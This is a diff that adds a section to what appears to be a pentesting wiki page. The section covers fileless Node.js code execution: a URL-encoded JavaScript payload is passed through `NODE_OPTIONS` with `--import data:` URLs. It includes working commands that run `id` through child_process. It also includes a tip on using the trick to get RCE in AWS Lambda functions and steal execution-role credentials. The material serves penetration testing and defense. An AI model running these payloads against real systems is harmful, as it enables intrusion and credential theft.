@@ -266,6 +266,27 @@ EOF
 NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
 ```
 
+#### Fileless preload with a `data:` URL
+
+When you can set `NODE_OPTIONS` but **cannot write a file** on the target (read-only filesystem, restricted API, serverless runtime, etc.), `--import` accepts a `data:text/javascript,` URL, so the whole payload travels inside the environment variable itself. The JavaScript must be **fully URL-encoded** — Node parses the value as a URL, so any raw space (or other unencoded char) truncates the payload and throws a `SyntaxError`. This works on Node 20.6+ where `--import` is on the `NODE_OPTIONS` allowlist.<sup>[[4]](#references)</sup>
+
+```bash
+# fileless proof of execution (note: no raw spaces in the data URL)
+NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'
+
+# Real payload, URL-encoded (run a command / exfiltrate env vars)
+PAYLOAD=$(python3 - <<'PY'
+import urllib.parse
+js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
+print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
+PY
+)
+NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
+```
+
+> [!TIP]
+> This is a common way to turn `NODE_OPTIONS` control into RCE on **managed cloud runtimes** whose functions run Node. For example, an attacker who can only change a Lambda's configuration (`lambda:UpdateFunctionConfiguration`, no `iam:PassRole`, no code update) can inject `NODE_OPTIONS=--import data:text/javascript,<payload>` to run code inside the function and steal its execution-role credentials. The injected module runs **before** the handler, which still executes normally afterwards.
+
 For remote gadget chains that set `NODE_OPTIONS` indirectly (for example, prototype-pollution to RCE), check [this other page](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).
 
 ### **RUBYLIB & RUBYOPT**
